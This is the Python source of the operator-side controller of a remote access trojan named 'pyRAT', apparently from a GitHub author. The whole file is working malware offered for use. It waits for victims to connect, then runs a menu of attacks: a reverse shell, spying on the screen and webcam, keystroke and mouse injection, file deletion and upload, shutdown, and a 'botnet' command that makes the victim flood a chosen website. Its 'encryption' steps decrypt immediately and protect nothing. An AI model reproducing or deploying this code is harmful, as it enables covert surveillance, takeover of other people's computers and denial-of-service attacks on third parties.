import sys
import os
import socket
import threading
import hashlib
from cryptography.fernet import Fernet
from vidstream import StreamingServer
from time import sleep


print(
    """
             ____      _  _____ 
 _ __  _   _|  _ \    / \|_   _|
| '_ \| | | | |_) |  / _ \ | |   ~>pyRAT<~
| |_) | |_| |  _ <  / ___ \| |  ~~>Made by tfwcodes(github)<~~
| .__/ \__, |_| \_\/_/   \_\_|  
|_|    |___/                    
    """
)

print("The commands are:  ")
print("[--rat] to start the rat")
print("[--exit] to exit" + "\n")

command3 = input("Enter a command: ")
if command3 == "--rat":
    print("The commands for the rat are: ")
    print("[sysinfo] to print info about the target system")
    print("[view_files] to see the path where the target runs the file")
    print("[custom_dir] to see all the files from a custom directory")
    print("[delete_file] to delete a file from the target (you need to know the path)")
    print("[send_files] to send a file (limit 10000 bytes)")
    print("[shutdown] to shutdown the target machine")
    print("[screen] to see the screen from your target (The screen will be stop when you close the client otherwise it wont work to close it) ")
    print("[camera] to see the camera from your target (The camera will be stop when you close the program otherwise it wont work to close it) ")
    print("[keystrokes] to send or execute keystrokes to your target")
    print("[reverse_shell] to gain a reverse Tcp shell (if you want to stop the shell write STOP)")
    print("[mouse_move] to send mouse events that change the position to the target")
    print("[mouse_click] to send mouse events that clicks the mouse")
    print("[botnet] to use your target machine to DoS sites" + "\n")

    host = socket.gethostname()
    try:
        print("The ip of the host is: " + "\n")
        host1 = os.system("ipconfig")
    except:
        host1 = os.system("ifconfig")
    print("The host that the target needs to connect is:", str(host))
    port = 8080
    def client():
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        print("Waiting for the target to connect")
        s.listen(1)
        conn, addr = s.accept()
        desktop = conn.recv(7000)
        desktop = desktop.decode()
        print("Connection from:", str(addr), "/", str(desktop))
        while 1:
            command = input(str("Enter a command: "))

            # encrypt the message

            encode_command = command.encode()
            key = Fernet.generate_key()

            f = Fernet(key)
            encrypted = f.encrypt(encode_command)

            decrypted = f.decrypt(encrypted)
            original_command = decrypted.decode()

            # Hash the message
            word = original_command

            original_comman_2 = original_command
            original_comman = original_comman_2.encode()
            y = hashlib.sha256(original_comman).hexdigest()

            for z in word:
                x = hashlib.sha256(original_comman).hexdigest()
                if x == y:
                    hash = word


            print("command sent")
            conn.send(hash.encode())


            if command == "view_files":
                try:
                    print("waiting")
                    files = conn.recv(5000)
                    files = files.decode()
                    print("path: ", files)
                except Exception as e:
                    print(str(e))
            elif command == "sysinfo":
                system = conn.recv(1024)
                system = system.decode()

                release = conn.recv(1024)
                release = release.decode()

                node = conn.recv(1024)
                node = node.decode()

                processor = conn.recv(1024)
                processor = processor.decode()
                print("The system is:", system)
                print("The release is:", release)
                print("The processor is:", processor)
                print("The node is:", node, "\n")
            elif command == "custom_dir":
                user_input = input(str("Enter the custom directory: "))
                conn.send(user_input.encode())
                files = conn.recv(5000)
                files = files.decode()
                print("custom dir: ", files)
            elif command == "delete_file":
                filename = input(str("Enter the filepath to delete: "))
                conn.send(filename.encode())
                print("The file was deleted")
            elif command == "send_files":
                file = input(str("Please enter the filename and the directory: "))
                namefile = input(str("Please enter the filename: "))
                encode_command_5 = namefile.encode()
                key6 = Fernet.generate_key()

                f5 = Fernet(key6)
                encrypted5 = f5.encrypt(encode_command_5)

                decrypted5 = f5.decrypt(encrypted5)
                original_command_5 = decrypted5.decode()
                data = open(file, "rb")
                file_data = data.read(10000)
                conn.send(original_command_5.encode())
                print("The file was sent successfully")
                conn.send(file_data)
            elif command == "shutdown":
                print("waiting")
                print("command executed")
            elif command == "screen":
                host1 = input(str("Enter the ip address to connect: "))
                encode_host_2 = host1.encode()
                key3 = Fernet.generate_key()

                f3 = Fernet(key3)
                encrypted3 = f3.encrypt(encode_host_2)

                decrypted3 = f3.decrypt(encrypted3)

                original_host3 = decrypted3.decode()


                conn.send(original_host3.encode())
                try:
                    receiver = StreamingServer(host1, 9999)

                    t1 = threading.Thread(target=receiver.start_server())
                    t1.start()

                except KeyboardInterrupt:
                    receiver.stop_server()
            elif command == "reverse_shell":
                while True:
                    cmd = input("Enter a command to execute: ")
                    conn.send(cmd.encode())
                    if cmd == "STOP":
                        exit()
                    else:
                        command_execute = conn.recv(7000).decode()
                        print(command_execute)
            elif command == "camera":
                host2 = input(str("Enter the ip address to connect: "))
                encode_host = host2.encode()
                key2 = Fernet.generate_key()

                f2 = Fernet(key2)
                encrypted2 = f2.encrypt(encode_host)

                decrypted2 = f2.decrypt(encrypted2)

                original_host2 = decrypted2.decode()


                conn.send(original_host2.encode())
                try:
                    receiver2 = StreamingServer(host2, 5555)

                    t2 = threading.Thread(target=receiver2.start_server())
                    t2.start()

                except KeyboardInterrupt:
                    receiver2.stop_server()

            elif command == "botnet":
                url = input(str("Enter the url target: "))
                number_of_threads = input("Enter the number of threads: ")
                conn.send(url.encode())
                conn.send(number_of_threads.encode())
                print("The attack is going (write STOP when you want to close the attack)")
                x = input("")
                if x == "STOP":
                    s.close()
            elif command == "keystrokes":
                keystrokes = input("Enter the keystrokes to send: ")
                executed = input("Do you want to be executed[y/n]: ")
                conn.send(executed.encode())
                if executed == "y":
                    conn.send(keystrokes.encode())
                    sleep(5)
                    print("keystrokes send")
                    sleep(1)
                    print("keystrokes executed")
                    sleep(4)
                elif executed == "n":
                    conn.send(keystrokes.encode())
                    sleep(5)
                    print("keystrokes send")
                    sleep(4)
            elif command == "mouse_move":
                x_direction = input("Enter the x direction to move the mouse: ")
                encode_host_4 = x_direction.encode()
                key3 = Fernet.generate_key()

                f4 = Fernet(key3)
                encrypted3 = f4.encrypt(encode_host_4)

                decrypted3 = f4.decrypt(encrypted3)

                original_host2_5 = decrypted3.decode()
                y_direction = input("Enter the y direction to move the mouse: ")
                encode_host_5 = x_direction.encode()
                key4 = Fernet.generate_key()

                f5 = Fernet(key4)
                encrypted4 = f5.encrypt(encode_host_5)

                decrypted4 = f5.decrypt(encrypted4)

                original_host2_6 = decrypted4.decode()
                conn.send(original_host2_6.encode())
                conn.send(y_direction.encode())
                print("mouse event sent")
                sleep(4)
                print("mouse event executed successfully")
            elif command == "mouse_click":
                print("mouse event sent")
                sleep(4)
                print("mouse event executed successfully")

    t = threading.Thread(target=client)
    t.start()

elif command3 == "exit":
    sys.exit(1)

else:
    print("The command does not exists")